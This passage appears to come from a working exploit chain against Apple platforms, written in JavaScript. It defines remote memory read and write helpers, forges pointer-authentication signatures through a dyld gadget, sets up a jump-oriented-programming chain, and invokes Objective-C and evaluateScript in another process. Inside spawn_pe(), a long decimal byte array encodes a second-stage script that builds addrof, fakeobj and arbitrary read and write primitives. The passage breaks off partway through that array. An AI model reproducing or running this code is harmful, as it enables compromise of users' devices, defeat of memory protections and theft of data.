    LOG(`guess_address: ${guess_address.hex()}`);
    return guess_address;
  }
  function mpd_malloc(sz) {
    return mpd_fcall(CALLOC, sz, 1n);
  }
  function mpd_malloc_timeout(sz) {
    return mpd_fcall_timeout(CALLOC, sz, 1n);
  }
  let mpd_memwrite_page_remote = 0n;
  let mpd_memwrite_page_local = 0n;
  function mpd_memwrite(remote_addr, local_addr, sz) {
    if (mpd_memwrite_page_remote == 0n) {
      mpd_memwrite_page_remote = surface_address_remote + PAGE_SIZE * 0x8n;
      mpd_memwrite_page_local = surface_address + PAGE_SIZE * 0x8n;
    }
    while (sz > 0n) {
      let tmp_sz = sz;
      if (sz > PAGE_SIZE) {
        tmp_sz = PAGE_SIZE;
      }
      memcpy(mpd_memwrite_page_local, local_addr, tmp_sz);
      mpd_fcall(MEMCPY, remote_addr, mpd_memwrite_page_remote, tmp_sz);
      sz -= tmp_sz;
      local_addr += tmp_sz;
      remote_addr += tmp_sz;
    }
  }
  function mpd_memread(local_addr, remote_addr, sz) {
    if (mpd_memwrite_page_remote == 0n) {
      mpd_memwrite_page_remote = surface_address_remote + PAGE_SIZE * 0x8n;
      mpd_memwrite_page_local = surface_address + PAGE_SIZE * 0x8n;
    }
    while (sz > 0n) {
      let tmp_sz = sz;
      if (sz > PAGE_SIZE) {
        tmp_sz = PAGE_SIZE;
      }
      mpd_fcall(MEMCPY, mpd_memwrite_page_remote, remote_addr, tmp_sz);
      memcpy(local_addr, mpd_memwrite_page_local, tmp_sz);
      sz -= tmp_sz;
      local_addr += tmp_sz;
      remote_addr += tmp_sz;
    }
  }
  function mpd_dump(addr, sz) {
    let data = calloc(1n, sz);
    mpd_memread(data, addr, sz);
    DUMP(data, sz);
  }
  function mpd_new_uint64(val) {
    let buf = mpd_malloc(0x8n);
    mpd_write64(buf, val);
    return buf;
  }
  function mpd_get_cstring(str) {
    // str is a JS string, get its length directly
    let str_len = BigInt(str.length);
    let mpd_c_str = mpd_malloc(str_len + 0x1n);
    // Copy each character to MPD memory
    for (let i = 0n; i < str_len; i++) {
      mpd_write8(mpd_c_str + i, BigInt(str.charCodeAt(Number(i))));
    }
    mpd_write8(mpd_c_str + str_len, 0n);  // null terminator
    return mpd_c_str;
  }
  function mpd_create_cfstring(js_str) {
    return mpd_fcall(CFSTRINGCREATEWITHCSTRING, kCFAllocatorDefault, mpd_get_cstring(js_str), kCFStringEncodingUTF8);
  }
  function mpd_sel_registerName(cstr) {
    return mpd_fcall(SEL_REGISTERNAME, cstr);
  }
  function mpd_objc_getClass(class_name) {
    return mpd_fcall(OBJC_GETCLASS, class_name);
  }
  function mpd_objc_alloc_init(class_obj) {
    return mpd_fcall(OBJC_ALLOC_INIT, class_obj);
  }
  function mpd_objc_msgSend(...args) {
    return mpd_fcall(OBJC_MSGSEND, ...args);
  }
  function mpd_objc_msgSend_nowait(...args) {
    return mpd_fcall_noreturn(OBJC_MSGSEND, ...args);
  }
  function mpd_objc_msgSend_nowait_exit(...args) {
    return mpd_fcall_noreturn_exit(OBJC_MSGSEND, ...args);
  }
  function mpd_objectForKeyedSubscript(obj, key) {
    let cfstr = mpd_create_cfstring(key);
    let selector = mpd_sel_registerName(mpd_get_cstring("objectForKeyedSubscript:"));
    return mpd_objc_msgSend(obj, selector, cfstr);
  }
  function mpd_setObjectForKeyedSubscript(obj, value, key) {
    let cfstr = mpd_create_cfstring(key);
    let selector = mpd_sel_registerName(mpd_get_cstring("setObject:forKeyedSubscript:"));
    return mpd_objc_msgSend(obj, selector, value, cfstr);
  }
  function mpd_increase_stack_limit() {
    let tls = mpd_fcall(PTHREAD_SELF);
    LOG("[MPD] tls: " + tls.hex());
    mpd_write64(tls + 0xb0n, surface_address_remote + surface_size);
    mpd_write64(tls + 0xb8n, surface_address_remote + surface_size - fcall_stack_sz);
  }
  function mpd_evaluateScript(obj, jscript) {
    let selector = mpd_sel_registerName(mpd_get_cstring("evaluateScript:"));
    return mpd_objc_msgSend(obj, selector, jscript);
  }
  function mpd_evaluateScript_nowait(obj, jscript) {
    let selector = mpd_sel_registerName(mpd_get_cstring("evaluateScript:"));
    return mpd_objc_msgSend_nowait(obj, selector, jscript);
  }
  function mpd_evaluateScript_nowait_exit(obj, jscript) {
    let selector = mpd_sel_registerName(mpd_get_cstring("evaluateScript:"));
    return mpd_objc_msgSend_nowait_exit(obj, selector, jscript);
  }
  function mpd_pacia(ptr, ctx) {
    // dyld_sign_pointer(ptr, addr, use_addr_diversity, ctx, key_type)
    // For pacia (key A, key_type=0)
    return mpd_fcall(dyld_signPointer_gadget, ptr, 0n, 0n, ctx, 0n);
  }
  function mpd_pacib(ptr, ctx) {
    // dyld_sign_pointer(ptr, addr, use_addr_diversity, ctx, key_type)
    // mpd_fcall(address, x0, x1, x2, x3, x4, x5, x6, x7)
    // For pacib with ctx <= 0xFFFF (no address diversity):
    // x0=ptr, x1=addr(0), x2=use_addr_diversity(0), x3=ctx, x4=key_type(1)
    return mpd_fcall(dyld_signPointer_gadget, ptr, 0n, 0n, ctx, 1n);
  }
  function mpd_setup_fcall_jopchain() {
    let jsvm_fcall_buff = mpd_malloc(PAGE_SIZE);
    let load_x1x3x8_args = jsvm_fcall_buff + 0x100n;
    let jsvm_fcall_args = jsvm_fcall_buff + 0x200n;
    mpd_write64(jsvm_fcall_buff + 0x0n, load_x1x3x8_args);
    // Use mpd_pacia (A key) for code pointers in MPD context
    mpd_write64(jsvm_fcall_buff + 0x8n, mpd_pacia(load_x1x3x8, 0n));
    mpd_write64(jsvm_fcall_buff + 0x10n, mpd_pacia(_CFObjectCopyProperty, 0n));
    mpd_write64(jsvm_fcall_buff + 0x40n, mpd_pacia(jsvm_isNAN_fcall_gadget2, 0n));
    mpd_write64(load_x1x3x8_args + 0x20n, load_x1x3x8_args + 0x40n);
    mpd_write64(load_x1x3x8_args + 0x28n, jsvm_fcall_args - 0x10n);
    mpd_write64(load_x1x3x8_args + 0x30n, mpd_pacia(0x41414141n, 0xC2D0n));
    mpd_write64(load_x1x3x8_args + 0x50n, mpd_pacia(fcall_14_args_write_x8, load_x1x3x8_args + 0x50n));
    return [jsvm_fcall_buff, load_x1x3x8_args + 0x30n, jsvm_fcall_args];
  }
  function spawn_pe() {
    LOG("[MPD] spawn_pe() called");
    LOG("Spawning PE....");
    LOG("[MPD] integrated=" + integrated);
    let pe_stage1_js_data = 0n;
    let pe_main_js_data = 0n;
    let pe_post_js_data = 0n;
    let pe_stage1_js_len = 0n;
    let pe_main_js_len = 0n;
    if (integrated) {
      let pe_stage1_js_data_array = new Uint8Array([40, 40, 41, 32, 61, 62, 32, 123, 10, 32, 32, 99, 111, 110, 115, 116, 32, 97, 98, 32, 61, 32, 110, 101, 119, 32, 65, 114, 114, 97, 121, 66, 117, 102, 102, 101, 114, 40, 56, 41, 59, 10, 32, 32, 99, 111, 110, 115, 116, 32, 117, 54, 52, 32, 61, 32, 110, 101, 119, 32, 66, 105, 103, 85, 105, 110, 116, 54, 52, 65, 114, 114, 97, 121, 40, 97, 98, 41, 59, 10, 32, 32, 99, 111, 110, 115, 116, 32, 117, 51, 50, 32, 61, 32, 110, 101, 119, 32, 85, 105, 110, 116, 51, 50, 65, 114, 114, 97, 121, 40, 97, 98, 41, 59, 10, 32, 32, 99, 111, 110, 115, 116, 32, 117, 56, 32, 61, 32, 110, 101, 119, 32, 85, 105, 110, 116, 56, 65, 114, 114, 97, 121, 40, 97, 98, 41, 59, 10, 32, 32, 99, 111, 110, 115, 116, 32, 102, 54, 52, 32, 61, 32, 110, 101, 119, 32, 70, 108, 111, 97, 116, 54, 52, 65, 114, 114, 97, 121, 40, 97, 98, 41, 59, 10, 32, 32, 66, 105, 103, 73, 110, 116, 46, 102, 114, 111, 109, 68, 111, 117, 98, 108, 101, 32, 61, 32, 102, 117, 110, 99, 116, 105, 111, 110, 32, 40, 118, 41, 32, 123, 10, 32, 32, 32, 32, 102, 54, 52, 91, 48, 93, 32, 61, 32, 118, 59, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 117, 54, 52, 91, 48, 93, 59, 10, 32, 32, 125, 59, 10, 32, 32, 66, 105, 103, 73, 110, 116, 46, 102, 114, 111, 109, 66, 121, 116, 101, 115, 32, 61, 32, 102, 117, 110, 99, 116, 105, 111, 110, 32, 40, 98, 121, 116, 101, 115, 41, 32, 123, 10, 32, 32, 32, 32, 102, 111, 114, 32, 40, 108, 101, 116, 32, 105, 32, 61, 32, 48, 59, 32, 105, 32, 60, 32, 56, 59, 32, 43, 43, 105, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 117, 56, 91, 105, 93, 32, 61, 32, 98, 121, 116, 101, 115, 91, 105, 93, 59, 10, 32, 32, 32, 32, 125, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 117, 54, 52, 91, 48, 93, 59, 10, 32, 32, 125, 59, 10, 32, 32, 66, 105, 103, 73, 110, 116, 46, 112, 114, 111, 116, 111, 116, 121, 112, 101, 46, 104, 101, 120, 32, 61, 32, 102, 117, 110, 99, 116, 105, 111, 110, 32, 40, 112, 97, 100, 78, 117, 109, 98, 101, 114, 32, 61, 32, 49, 54, 44, 32, 112, 97, 100, 67, 104, 97, 114, 32, 61, 32, 48, 41, 32, 123, 10, 32, 32, 32, 32, 108, 101, 116, 32, 115, 32, 61, 32, 39, 48, 120, 39, 32, 43, 32, 116, 104, 105, 115, 46, 116, 111, 83, 116, 114, 105, 110, 103, 40, 49, 54, 41, 46, 112, 97, 100, 83, 116, 97, 114, 116, 40, 112, 97, 100, 78, 117, 109, 98, 101, 114, 44, 32, 112, 97, 100, 67, 104, 97, 114, 41, 59, 10, 32, 32, 32, 32, 91, 93, 91, 115, 93, 59, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 115, 59, 10, 32, 32, 125, 59, 10, 32, 32, 66, 105, 103, 73, 110, 116, 46, 112, 114, 111, 116, 111, 116, 121, 112, 101, 46, 104, 101, 120, 80, 108, 97, 105, 110, 32, 61, 32, 102, 117, 110, 99, 116, 105, 111, 110, 32, 40, 112, 97, 100, 78, 117, 109, 98, 101, 114, 32, 61, 32, 49, 54, 44, 32, 112, 97, 100, 67, 104, 97, 114, 32, 61, 32, 48, 41, 32, 123, 10, 32, 32, 32, 32, 108, 101, 116, 32, 115, 32, 61, 32, 116, 104, 105, 115, 46, 116, 111, 83, 116, 114, 105, 110, 103, 40, 49, 54, 41, 46, 112, 97, 100, 83, 116, 97, 114, 116, 40, 112, 97, 100, 78, 117, 109, 98, 101, 114, 44, 32, 112, 97, 100, 67, 104, 97, 114, 41, 59, 10, 32, 32, 32, 32, 91, 93, 91, 115, 93, 59, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 115, 59, 10, 32, 32, 125, 59, 10, 32, 32, 66, 105, 103, 73, 110, 116, 46, 112, 114, 111, 116, 111, 116, 121, 112, 101, 46, 97, 115, 68, 111, 117, 98, 108, 101, 32, 61, 32, 102, 117, 110, 99, 116, 105, 111, 110, 32, 40, 41, 32, 123, 10, 32, 32, 32, 32, 117, 54, 52, 91, 48, 93, 32, 61, 32, 116, 104, 105, 115, 59, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 54, 52, 91, 48, 93, 59, 10, 32, 32, 125, 59, 10, 32, 32, 66, 105, 103, 73, 110, 116, 46, 112, 114, 111, 116, 111, 116, 121, 112, 101, 46, 110, 111, 80, 65, 67, 32, 61, 32, 102, 117, 110, 99, 116, 105, 111, 110, 32, 40, 111, 116, 104, 101, 114, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 116, 104, 105, 115, 32, 38, 32, 48, 120, 55, 102, 102, 102, 102, 102, 102, 102, 102, 102, 110, 59, 10, 32, 32, 125, 59, 10, 32, 32, 66, 105, 103, 73, 110, 116, 46, 112, 114, 111, 116, 111, 116, 121, 112, 101, 46, 97, 115, 73, 110, 116, 51, 50, 115, 32, 61, 32, 102, 117, 110, 99, 116, 105, 111, 110, 32, 40, 41, 32, 123, 10, 32, 32, 32, 32, 117, 54, 52, 91, 48, 93, 32, 61, 32, 116, 104, 105, 115, 59, 10, 32, 32, 32, 32, 99, 111, 110, 115, 116, 32, 108, 111, 32, 61, 32, 117, 51, 50, 91, 48, 93, 59, 10, 32, 32, 32, 32, 99, 111, 110, 115, 116, 32, 104, 105, 32, 61, 32, 117, 51, 50, 91, 49, 93, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 110, 101, 119, 95, 104, 105, 32, 61, 32, 104, 105, 59, 10, 32, 32, 32, 32, 105, 102, 32, 40, 104, 105, 32, 62, 61, 32, 48, 120, 56, 48, 48, 48, 48, 48, 48, 48, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 110, 101, 119, 95, 104, 105, 32, 61, 32, 104, 105, 32, 45, 32, 48, 120, 49, 48, 48, 48, 48, 48, 48, 48, 48, 32, 38, 32, 48, 120, 102, 102, 102, 102, 102, 102, 102, 102, 59, 10, 32, 32, 32, 32, 125, 10, 32, 32, 32, 32, 108, 101, 116, 32, 110, 101, 119, 95, 108, 111, 32, 61, 32, 108, 111, 59, 10, 32, 32, 32, 32, 105, 102, 32, 40, 108, 111, 32, 62, 61, 32, 48, 120, 56, 48, 48, 48, 48, 48, 48, 48, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 110, 101, 119, 95, 108, 111, 32, 61, 32, 108, 111, 32, 45, 32, 48, 120, 49, 48, 48, 48, 48, 48, 48, 48, 48, 32, 38, 32, 48, 120, 102, 102, 102, 102, 102, 102, 102, 102, 59, 10, 32, 32, 32, 32, 125, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 91, 110, 101, 119, 95, 108, 111, 44, 32, 110, 101, 119, 95, 104, 105, 93, 59, 10, 32, 32, 125, 59, 10, 32, 32, 99, 111, 110, 115, 116, 32, 110, 111, 67, 111, 119, 32, 61, 32, 49, 46, 49, 59, 10, 32, 32, 117, 110, 98, 111, 120, 101, 100, 95, 97, 114, 114, 32, 61, 32, 91, 110, 111, 67, 111, 119, 93, 59, 10, 32, 32, 98, 111, 120, 101, 100, 95, 97, 114, 114, 32, 61, 32, 91, 123, 125, 93, 59, 10, 32, 32, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 97, 114, 114, 97, 121, 32, 61, 32, 110, 101, 119, 32, 85, 105, 110, 116, 56, 65, 114, 114, 97, 121, 40, 48, 120, 52, 48, 48, 48, 41, 46, 102, 105, 108, 108, 40, 48, 120, 102, 101, 41, 59, 10, 32, 32, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 32, 61, 32, 110, 101, 119, 32, 66, 105, 103, 85, 105, 110, 116, 54, 52, 65, 114, 114, 97, 121, 40, 48, 120, 49, 48, 48, 48, 41, 59, 10, 32, 32, 114, 119, 95, 97, 114, 114, 97, 121, 32, 61, 32, 110, 101, 119, 32, 66, 105, 103, 85, 105, 110, 116, 54, 52, 65, 114, 114, 97, 121, 40, 48, 120, 49, 48, 48, 48, 41, 59, 10, 32, 32, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 32, 61, 32, 110, 101, 119, 32, 66, 105, 103, 85, 105, 110, 116, 54, 52, 65, 114, 114, 97, 121, 40, 48, 120, 49, 48, 48, 48, 41, 59, 10, 32, 32, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 32, 61, 32, 110, 101, 119, 32, 85, 105, 110, 116, 56, 65, 114, 114, 97, 121, 40, 48, 120, 49, 48, 48, 48, 41, 59, 10, 32, 32, 99, 111, 110, 115, 116, 32, 109, 101, 109, 32, 61, 32, 123, 10, 32, 32, 32, 32, 97, 100, 100, 114, 111, 102, 58, 32, 117, 110, 100, 101, 102, 105, 110, 101, 100, 44, 10, 32, 32, 32, 32, 102, 97, 107, 101, 111, 98, 106, 58, 32, 117, 110, 100, 101, 102, 105, 110, 101, 100, 44, 10, 32, 32, 32, 32, 114, 101, 97, 100, 54, 52, 58, 32, 117, 110, 100, 101, 102, 105, 110, 101, 100, 44, 10, 32, 32, 32, 32, 119, 114, 105, 116, 101, 54, 52, 58, 32, 117, 110, 100, 101, 102, 105, 110, 101, 100, 10, 32, 32, 125, 59, 10, 32, 32, 97, 100, 100, 114, 111, 102, 32, 61, 32, 102, 117, 110, 99, 116, 105, 111, 110, 32, 40, 111, 41, 32, 123, 10, 32, 32, 32, 32, 98, 111, 120, 101, 100, 95, 97, 114, 114, 91, 48, 93, 32, 61, 32, 111, 59, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 66, 105, 103, 73, 110, 116, 46, 102, 114, 111, 109, 68, 111, 117, 98, 108, 101, 40, 117, 110, 98, 111, 120, 101, 100, 95, 97, 114, 114, 91, 48, 93, 41, 59, 10, 32, 32, 125, 59, 10, 32, 32, 102, 97, 107, 101, 111, 98, 106, 32, 61, 32, 102, 117, 110, 99, 116, 105, 111, 110, 32, 40, 97, 100, 100, 114, 41, 32, 123, 10, 32, 32, 32, 32, 117, 110, 98, 111, 120, 101, 100, 95, 97, 114, 114, 91, 48, 93, 32, 61, 32, 97, 100, 100, 114, 46, 97, 115, 68, 111, 117, 98, 108, 101, 40, 41, 59, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 98, 111, 120, 101, 100, 95, 97, 114, 114, 91, 48, 93, 59, 10, 32, 32, 125, 59, 10, 32, 32, 114, 101, 97, 100, 54, 52, 32, 61, 32, 102, 117, 110, 99, 116, 105, 111, 110, 32, 40, 119, 104, 101, 114, 101, 41, 32, 123, 10, 32, 32, 32, 32, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 91, 48, 93, 32, 61, 32, 119, 104, 101, 114, 101, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 114, 115, 32, 61, 32, 114, 119, 95, 97, 114, 114, 97, 121, 91, 48, 93, 59, 10, 32, 32, 32, 32, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 91, 48, 93, 32, 61, 32, 48, 110, 59, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 114, 115, 59, 10, 32, 32, 125, 59, 10, 32, 32, 99, 109, 112, 54, 52, 32, 61, 32, 102, 117, 110, 99, 116, 105, 111, 110, 32, 40, 119, 104, 101, 114, 101, 44, 32, 118, 97, 108, 117, 101, 41, 32, 123, 10, 32, 32, 32, 32, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 91, 48, 93, 32, 61, 32, 119, 104, 101, 114, 101, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 114, 115, 32, 61, 32, 114, 119, 95, 97, 114, 114, 97, 121, 91, 48, 93, 32, 61, 61, 32, 118, 97, 108, 117, 101, 59, 10, 32, 32, 32, 32, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 91, 48, 93, 32, 61, 32, 48, 110, 59, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 114, 115, 59, 10, 32, 32, 125, 59, 10, 32, 32, 119, 114, 105, 116, 101, 54, 52, 32, 61, 32, 102, 117, 110, 99, 116, 105, 111, 110, 32, 40, 119, 104, 101, 114, 101, 44, 32, 119, 104, 97, 116, 41, 32, 123, 10, 32, 32, 32, 32, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 91, 48, 93, 32, 61, 32, 119, 104, 101, 114, 101, 59, 10, 32, 32, 32, 32, 114, 119, 95, 97, 114, 114, 97, 121, 91, 48, 93, 32, 61, 32, 119, 104, 97, 116, 59, 10, 32, 32, 32, 32, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 91, 48, 93, 32, 61, 32, 48, 110, 59, 10, 32, 32, 125, 59, 10, 32, 32, 117, 114, 101, 97, 100, 56, 32, 61, 32, 102, 117, 110, 99, 116, 105, 111, 110, 32, 40, 119, 104, 101, 114, 101, 41, 32, 123, 10, 32, 32, 32, 32, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 91, 48, 93, 32, 61, 32, 119, 104, 101, 114, 101, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 114, 115, 32, 61, 32, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 91, 48, 93, 59, 10, 32, 32, 32, 32, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 91, 48, 93, 32, 61, 32, 48, 110, 59, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 114, 115, 59, 10, 32, 32, 125, 59, 10, 32, 32, 117, 119, 114, 105, 116, 101, 56, 32, 61, 32, 102, 117, 110, 99, 116, 105, 111, 110, 32, 40, 119, 104, 101, 114, 101, 44, 32, 119, 104, 97, 116, 41, 32, 123, 10, 32, 32, 32, 32, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 91, 48, 93, 32, 61, 32, 119, 104, 101, 114, 101, 59, 10, 32, 32, 32, 32, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 91, 48, 93, 32, 61, 32, 119, 104, 97, 116, 59, 10, 32, 32, 32, 32, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 91, 48, 93, 32, 61, 32, 48, 110, 59, 10, 32, 32, 125, 59, 10, 32, 32, 99, 109, 112, 56, 95, 119, 97, 105, 116, 95, 102, 111, 114, 95, 99, 104, 97, 110, 103, 101, 32, 61, 32, 102, 117, 110, 99, 116, 105, 111, 110, 32, 40, 119, 104, 101, 114, 101, 44, 32, 118, 97, 108, 117, 101, 41, 32, 123, 10, 32, 32, 32, 32, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 91, 48, 93, 32, 61, 32, 119, 104, 101, 114, 101, 59, 10, 32, 32, 32, 32, 119, 104, 105, 108, 101, 32, 40, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 91, 48, 93, 32, 61, 61, 32, 118, 97, 108, 117, 101, 41, 59, 10, 32, 32, 32, 32, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 91, 48, 93, 32, 61, 32, 48, 110, 59, 10, 32, 32, 125, 59, 10, 32, 32, 109, 101, 109, 46, 97, 100, 100, 114, 111, 102, 32, 61, 32, 97, 100, 100, 114, 111, 102, 59, 10, 32, 32, 109, 101, 109, 46, 102, 97, 107, 101, 111, 98, 106, 32, 61, 32, 102, 97, 107, 101, 111, 98, 106, 59, 10, 32, 32, 109, 101, 109, 46, 114, 101, 97, 100, 54, 52, 32, 61, 32, 114, 101, 97, 100, 54, 52, 59, 10, 32, 32, 109, 101, 109, 46, 119, 114, 105, 116, 101, 54, 52, 32, 61, 32, 119, 114, 105, 116, 101, 54, 52, 59, 10, 32, 32, 117, 114, 101, 97, 100, 54, 52, 32, 61, 32, 109, 101, 109, 46, 114, 101, 97, 100, 54, 52, 59, 10, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 32, 61, 32, 109, 101, 109, 46, 119, 114, 105, 116, 101, 54, 52, 59, 10, 32, 32, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 32, 61, 32, 102, 117, 110, 99, 116, 105, 111, 110, 32, 40, 106, 115, 95, 115, 116, 114, 41, 32, 123, 10, 32, 32, 32, 32, 108, 101, 116, 32, 115, 32, 61, 32, 106, 115, 95, 115, 116, 114, 32, 43, 32, 34, 92, 120, 48, 48, 34, 59, 10, 32, 32, 32, 32, 91, 93, 91, 115, 93, 59, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 114, 101, 97, 100, 54, 52, 40, 114, 101, 97, 100, 54, 52, 40, 97, 100, 100, 114, 111, 102, 40, 115, 41, 32, 43, 32, 48, 120, 56, 110, 41, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 125, 59, 10, 32, 32, 110, 101, 119, 95, 98, 105, 103, 105, 110, 116, 32, 61, 32, 102, 117, 110, 99, 116, 105, 111, 110, 32, 40, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 66, 105, 103, 73, 110, 116, 40, 34, 48, 120, 51, 51, 51, 51, 34, 41, 59, 10, 32, 32, 125, 59, 10, 32, 32, 117, 112, 100, 97, 116, 101, 95, 98, 105, 103, 105, 110, 116, 32, 61, 32, 102, 117, 110, 99, 116, 105, 111, 110, 32, 40, 98, 105, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 98, 105, 32, 43, 32, 48, 120, 49, 110, 32, 45, 32, 48, 120, 49, 110, 59, 10, 32, 32, 125, 59, 10, 32, 32, 103, 101, 116, 95, 98, 105, 103, 105, 110, 116, 95, 97, 100, 100, 114, 32, 61, 32, 102, 117, 110, 99, 116, 105, 111, 110, 32, 40, 98, 105, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 117, 114, 101, 97, 100, 54, 52, 40, 97, 100, 100, 114, 111, 102, 40, 98, 105, 41, 32, 43, 32, 48, 120, 49, 56, 110, 41, 59, 10, 32, 32, 125, 59, 10, 32, 32, 102, 99, 97, 108, 108, 32, 61, 32, 117, 110, 100, 101, 102, 105, 110, 101, 100, 59, 10, 32, 32, 103, 112, 117, 95, 102, 99, 97, 108, 108, 32, 61, 32, 117, 110, 100, 101, 102, 105, 110, 101, 100, 59, 10, 32, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 32, 61, 32, 117, 110, 100, 101, 102, 105, 110, 101, 100, 59, 10, 32, 32, 112, 97, 99, 105, 97, 32, 61, 32, 117, 110, 100, 101, 102, 105, 110, 101, 100, 59, 10, 32, 32, 112, 97, 99, 105, 98, 32, 61, 32, 117, 110, 100, 101, 102, 105, 110, 101, 100, 59, 10, 32, 32, 76, 79, 71, 32, 61, 32, 117, 110, 100, 101, 102, 105, 110, 101, 100, 59, 10, 32, 32, 105, 110, 116, 101, 103, 114, 97, 116, 101, 100, 32, 61, 32, 102, 97, 108, 115, 101, 59, 10, 32, 32, 117, 115, 101, 95, 106, 115, 95, 116, 104, 114, 101, 97, 100, 32, 61, 32, 102, 97, 108, 115, 101, 59, 10, 32, 32, 95, 67, 70, 79, 98, 106, 101, 99, 116, 67, 111, 112, 121, 80, 114, 111, 112, 101, 114, 116, 121, 32, 61, 32, 48, 110, 59, 10, 32, 32, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 32, 61, 32, 48, 110, 59, 10, 32, 32, 102, 99, 97, 108, 108, 95, 49, 52, 95, 97, 114, 103, 115, 95, 119, 114, 105, 116, 101, 95, 120, 56, 32, 61, 32, 48, 110, 59, 10, 32, 32, 106, 115, 118, 109, 95, 105, 115, 78, 65, 78, 95, 102, 99, 97, 108, 108, 95, 103, 97, 100, 103, 101, 116, 32, 61, 32, 48, 110, 59, 10, 32, 32, 106, 115, 118, 109, 95, 105, 115, 78, 65, 78, 95, 102, 99, 97, 108, 108, 95, 103, 97, 100, 103, 101, 116, 50, 32, 61, 32, 48, 110, 59, 10, 32, 32, 120, 112, 97, 99, 95, 103, 97, 100, 103, 101, 116, 32, 61, 32, 48, 110, 59, 10, 32, 32, 115, 116, 97, 103, 101, 49, 95, 106, 115, 32, 61, 32, 48, 110, 59, 10, 32, 32, 115, 116, 97, 103, 101, 50, 95, 106, 115, 32, 61, 32, 48, 110, 59, 10, 32, 32, 108, 101, 116, 32, 108, 111, 103, 95, 98, 117, 102, 102, 101, 114, 32, 61, 32, 48, 110, 59, 10, 32, 32, 108, 101, 116, 32, 108, 111, 103, 95, 111, 102, 102, 115, 101, 116, 95, 112, 116, 114, 32, 61, 32, 48, 110, 59, 10, 32, 32, 108, 101, 116, 32, 108, 111, 103, 95, 98, 117, 102, 102, 101, 114, 95, 115, 105, 122, 101, 32, 61, 32, 48, 110, 59, 10, 32, 32, 116, 104, 114, 101, 97, 100, 95, 97, 114, 103, 32, 61, 32, 48, 110, 59, 10, 32, 32, 103, 101, 116, 95, 116, 104, 114, 101, 97, 100, 95, 97, 114, 103, 115, 32, 61, 32, 102, 117, 110, 99, 116, 105, 111, 110, 32, 40, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 116, 104, 114, 101, 97, 100, 95, 97, 114, 103, 59, 10, 32, 32, 125, 59, 10, 32, 32, 108, 101, 116, 32, 83, 89, 83, 76, 79, 71, 32, 61, 32, 48, 110, 59, 10, 32, 32, 102, 99, 97, 108, 108, 95, 105, 110, 105, 116, 32, 61, 32, 102, 117, 110, 99, 116, 105, 111, 110, 32, 40, 41, 32, 123, 10, 32, 32, 32, 32, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 97, 100, 100, 114, 111, 102, 40, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 97, 114, 114, 97, 121, 41, 32, 43, 32, 48, 120, 49, 48, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 105, 100, 120, 32, 61, 32, 48, 110, 59, 10, 32, 32, 32, 32, 68, 76, 83, 89, 77, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 32, 43, 32, 105, 100, 120, 32, 42, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 105, 100, 120, 